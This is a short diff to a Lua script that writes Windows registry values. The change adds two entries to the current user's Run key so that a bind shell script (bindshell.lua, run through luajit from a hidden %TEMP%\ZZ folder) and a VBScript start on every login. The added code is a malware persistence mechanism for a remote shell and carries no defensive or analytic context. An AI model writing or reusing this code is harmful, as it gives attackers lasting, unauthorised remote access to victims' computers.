@@ -77,11 +77,19 @@ function writeRegistryValue(key, subKey, valueName, valueData)
     return false
 end
 
--- Example usage to write a file path to the registry
-local filePath = "%TEMP%\\bindshell.cmd"
-local success = writeRegistryValue(HKEY_CURRENT_USER, "Software\\MyApp", "FilePath", filePath)
-if success then
-    print("Successfully wrote the registry value.")
+-- Example usage to write file paths to the registry to run at startup
+local bindShellPath = [[%TEMP%\ZZ\Luapath\luajit.exe %TEMP%\ZZ\bindshell.lua]]
+local vbsPath = [[wscript.exe "%TEMP%\ZZ\win.vbs"]]
+
+local successBindShell = writeRegistryValue(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", "BindShellStartup", bindShellPath)
+local successVbs = writeRegistryValue(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", "VBSStartup", vbsPath)
+
+if successBindShell and successVbs then
+    print("Successfully wrote both registry values.")
+elseif successBindShell then
+    print("Successfully wrote the registry value for BindShellStartup but failed for VBSStartup.")
+elseif successVbs then
+    print("Successfully wrote the registry value for VBSStartup but failed for BindShellStartup.")
 else
-    print("Failed to write the registry value.")
+    print("Failed to write both registry values.")
 end
